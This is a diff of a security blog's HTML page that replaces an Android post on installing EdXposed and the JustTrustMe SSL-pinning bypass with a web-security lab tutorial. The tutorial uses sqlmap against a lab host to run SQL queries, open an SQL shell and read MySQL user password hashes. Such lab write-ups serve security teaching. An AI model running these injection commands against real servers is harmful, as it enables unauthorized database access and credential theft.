@@ -19,7 +19,7 @@
     <meta name="keywords" content="tea9,tea9的博客,开发,android,安全,android安全,android逆向,移动安全,frida,xposed,ollvm,查查查,茶茶茶,茶茶,茶姐姐,茶姐姐博客,茶茶茶博客,茶茶blog">
 
 
-<title>unicorn在安卓中使用 | tea9のblog</title>
+<title>web安全实验-SQLmap工具-执行SQL命令 | tea9のblog</title>
 
 
 
@@ -137,7 +137,7 @@
     
     <article class="post-wrap">
         <header class="post-header">
-            <h1 class="post-title">unicorn在安卓中使用</h1>
+            <h1 class="post-title">web安全实验-SQLmap工具-执行SQL命令</h1>
             
                 <div class="post-meta">
                     
@@ -146,7 +146,7 @@
 
                     
                         <span class="post-time">
-                        Date: <a href="#">二月 19, 2021&nbsp;&nbsp;16:30:27</a>
+                        Date: <a href="#">十一月 9, 2020&nbsp;&nbsp;22:15:23</a>
                         </span>
                     
                     
@@ -162,41 +162,32 @@
         </header>
 
         <div class="post-content">
-            <p><a target="_blank" rel="noopener" href="https://github.com/ElderDrivers/EdXposed">https://github.com/ElderDrivers/EdXposed</a></p>
-<p>前提先安装magisk</p>
-<p>下载</p>
-<p>v23.5</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/RikkaApps/Riru/releases">https://github.com/RikkaApps/Riru/releases</a></p>
-<p>v21.1</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/yangzhaofeng/riru-core">https://github.com/yangzhaofeng/riru-core</a></p>
-<p>adb push magisk-riru-v21.1.zip &#x2F;sdcard&#x2F; </p>
-<p>magisk manager </p>
-<p>选择模块</p>
-<p>从本地安装</p>
-<p>选择magisk-riru-v21.1.zip</p>
-<p>安装成功后重启</p>
-<p>下载EdXposed-SandHook-v0.4.6.2.4529.-release.zip</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/ElderDrivers/EdXposed/releases/tag/v0.4.6.4">https://github.com/ElderDrivers/EdXposed/releases/tag/v0.4.6.4</a></p>
-<p>adb push EdXposed-SandHook-v0.4.6.2.4529.-release.zip &#x2F;sdcard</p>
-<p>magisk manager </p>
-<p>选择模块</p>
-<p>从本地安装</p>
-<p>选择EdXposed-SandHook-v0.4.6.2.4529.-release.zip</p>
-<p>安装成功后重启</p>
-<p>下载edxoosed manager</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/ElderDrivers/EdXposedManager/releases">https://github.com/ElderDrivers/EdXposedManager/releases</a></p>
-<p>adb install EdXposedManager-4.5.7-45700-org.meowcat.edxposed.manager-release.apk</p>
-<p><img src="https://raw.githubusercontent.com/tea9/image/master/blog_img/66/2.png"></p>
-<p>下载justtrustme</p>
-<p>JustTrustMe：屏蔽App SSL Pinning校验利器</p>
-<p><a target="_blank" rel="noopener" href="https://files-cdn.cnblogs.com/files/pingming/JustTrustMe.apk">https://files-cdn.cnblogs.com/files/pingming/JustTrustMe.apk</a></p>
-<p>安装</p>
-<p>adb install JustTrustMe.apk</p>
-<p>edxposed模块中开启 重启手机</p>
-<p>工具：</p>
-<p>链接: <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1cjqaT0euQ5sHsccr9n9eJw">https://pan.baidu.com/s/1cjqaT0euQ5sHsccr9n9eJw</a>  密码: gns8</p>
-<p>参考：</p>
-<p><a target="_blank" rel="noopener" href="https://www.mafuli.com/?p=19">https://www.mafuli.com/?p=19</a></p>
+            <p>步骤1:测试注入点</p>
+<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://172.16.12.2/inject.php?id=1&quot;">http://172.16.12.2/inject.php?id=1&quot;</a></p>
+<p>成功验证该注入点</p>
+<p>web server operating system: Windows  &#x2F;&#x2F;操作系统 web application technology: Apache 2.4.10, PHP 5.2.17 &#x2F;&#x2F;WEB容器 back-end DBMS: MySQL &gt;&#x3D; 5.5   &#x2F;&#x2F;MySQL版本</p>
+<p>步骤2:执行指定的SQL语句</p>
+<p>–sql-query&#x3D;QUERY</p>
+<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://172.16.12.2/inject.php?id=1&quot;">http://172.16.12.2/inject.php?id=1&quot;</a> –sql-query&#x3D;”select @@version”</p>
+<p>步骤3:交互式的SQL命令行</p>
+<p>–sql-shell</p>
+<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://172.16.12.2/inject.php?id=1&quot;">http://172.16.12.2/inject.php?id=1&quot;</a> –sql-shell</p>
+<p>select @@version</p>
+<p>select @@datadir &#x2F;&#x2F;查询当前数据库文件存放路径的语句</p>
+<p>x或q退出交互式SQL命令行</p>
+<p>步骤4:执行文件中的SQL语句</p>
+<p>–sql-file&#x3D;sql文件 直接执行SQL文件中的语句</p>
+<p>c盘新建一个SQL文件 1.sql</p>
+<p>内容：</p>
+<p>select version();  &#x2F;&#x2F;查询数据库版本</p>
+<p>select @@basedir; &#x2F;&#x2F;查询数据库存放路径</p>
+<p>select password from mysql.user;  &#x2F;&#x2F;查询MySQL用户密码</p>
+<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://172.16.12.2/inject.php?id=1&quot;">http://172.16.12.2/inject.php?id=1&quot;</a> –sql-file&#x3D;c:&#x2F;1.sql</p>
+<p><strong>思考</strong></p>
+<ul>
+<li>这几种执行命令的方式有何不同？各满足什么需求？</li>
+<li>上述情况下，能执行UPDATE 之类的SQL语句吗？</li>
+</ul>
 
         </div>
 
@@ -211,7 +202,7 @@
                 
                     <p class="copyright-item">
                         <span>Permalink:</span>
-                        <span><a href="http://tea9.xyz/post/523094392.html">http://tea9.xyz/post/523094392.html</a></span>
+                        <span><a href="http://tea9.xyz/post/1004399563.html">http://tea9.xyz/post/1004399563.html</a></span>
                     </p>
                 
                 
@@ -235,7 +226,7 @@
                 <span class="tag">
                     
                     
-                        <a href="/tags/android/"># android</a>
+                        <a href="/tags/web%E5%AE%89%E5%85%A8/"># web安全</a>
                     
                         
                 </span>
@@ -248,10 +239,10 @@
         </section>
         <section class="post-nav">
             
-                <a class="prev" rel="prev" href="/post/2066460757.html">kali nethunter nexus 5使用</a>
+                <a class="prev" rel="prev" href="/post/2514301866.html">web安全实验-SQLmap工具-SQLmap初步</a>
             
             
-            <a class="next" rel="next" href="/post/420274721.html">常用的URLscheme</a>
+            <a class="next" rel="next" href="/post/970197813.html">web安全实验-SQL注入漏洞原理及防范-上</a>
             
         </section>
     </article>
